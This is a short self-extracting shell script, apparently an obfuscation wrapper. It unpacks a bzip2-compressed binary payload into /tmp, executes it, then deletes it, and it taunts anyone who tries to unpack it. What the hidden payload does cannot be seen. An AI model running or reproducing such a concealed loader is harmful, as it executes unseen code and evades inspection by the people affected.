#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SYʚf  �_� ������~����POh� ����4�@� 4 ��  ԓ�4ѣ ��h� �   8ɓF�Ѧ##C��4�� a�L�4�1�Ѧ �h0��Ѐ& &	OҞS�����Lz��M=�4lf��"KY��mC��6�k(W��q�C�\Ӗ D"$h5�����{������U��ُ��dD����a�H�d8�O�g��BM(	p�ϤID'Z F�h�����9#HRk_%M�BP���y�r��������{����H�t
�g{�����q�:N .��䖒ގ�͜7��8yi\�D�X�6�L)�rj*k�+�� xyd�-�(�!�4�x���X�x���s���J��� �@9<���׳s�<��u����92�!�a�#��������`���kx�Ι��"2;��D�"�x�Un�!�%�(�.�DKr7�1�x���*�ġ7�u�Æ���2jqM�� �d� �I�P��dR^s�� ��Hu������t�@���
��ޮ����
v}��u��|`�ԕlo�TzB�<�Z�����2.$���� y	q���a&����B+F��3��IsF�nѽ�ق�������u��c���u`���^C�ɛR	�ICA6"�計�R�5 ��y��,580�(�8�y@NpQ��*#H"	^ԋ���a��Mq3��"ь�j`��l3ʁ�U�~0v�AȠ�T��o����x0jڷ՚%�Y�&	�%.2�`i�+��\���E��z����ǪR{	�
�.A��)$��BF!S�	YW:'��~TUU��9��s]@`�����@x��"u˰����l��(��)�T�0